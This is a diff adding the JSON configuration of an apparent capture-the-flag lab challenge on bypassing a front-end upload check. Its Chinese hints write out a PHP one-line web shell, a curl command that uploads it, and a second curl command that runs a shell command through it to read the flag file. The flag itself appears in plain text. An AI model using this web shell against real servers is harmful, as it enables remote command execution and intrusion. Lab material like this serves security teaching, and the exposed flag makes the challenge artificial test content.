@@ -1,0 +1,24 @@
+{
+  "id": "upload1",
+  "category": "upload",
+  "title": "前端校验绕过",
+  "difficulty": "easy",
+  "url_path": "/upload1",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{upload1_f221f5d2}",
+  "knowledge": [
+    "前端 JS 校验的无效性",
+    "curl 直接构造上传请求",
+    "一句话木马",
+    "读注释里的 flag"
+  ],
+  "hints": [
+    "点上传按钮会被 JS 拦住？JS 是在【你的浏览器】里运行的，你可以 F12 删掉校验函数，也可以干脆不用浏览器——用 curl 直接发 multipart 请求。",
+    "curl -F \"avatar=@shell.php\" http://TARGET/upload1/ 上传一个内容为 <?php system($_GET['c']);?> 的 shell.php（先在本地把文件写好）。",
+    "完整命令：\ncurl -F \"avatar=@shell.php\" http://TARGET/upload1/\ncurl \"http://TARGET/upload1/uploads/shell.php?c=cat%20../flag.php\"\nflag.php 的 PHP 注释里就是 flag。"
+  ],
+  "writeup": "writeup.md",
+  "prev": null,
+  "next": "upload2"
+}
